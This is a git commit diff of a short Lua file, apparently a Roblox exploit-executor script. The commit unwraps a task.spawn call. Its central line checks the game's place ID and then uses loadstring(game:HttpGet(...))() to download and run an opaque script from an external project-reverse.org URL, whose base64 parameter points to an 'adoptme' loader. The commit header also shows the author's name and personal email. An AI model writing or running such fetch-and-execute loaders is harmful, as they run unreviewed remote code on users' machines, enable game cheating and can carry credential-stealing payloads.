d7444dc5be7d92cb3540c20d38ecb7943031f115
leonix <furkan62.bakir@gmail.com>
2026-07-19 05:16:35 +0300

    Update yessir.lua

--- yessir.lua
+++ yessir.lua
@@ -1,5 +1,4 @@
-task.spawn(function()
-    local placeId = game.PlaceId
+local placeId = game.PlaceId
 
     if placeId == 920587237 then
         loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImNiYjE2Yjk5LTQ4MTQtNDZjOS05ZThmLWJlOWYwYjFjZTMzMSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJjdXN0b20iLCJ1cmwiOiJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vbHV4aW4yNi92aXN1YWwvcmVmcy9oZWFkcy9tYWluL2Fkb3B0bWUubHVhIn19"))()
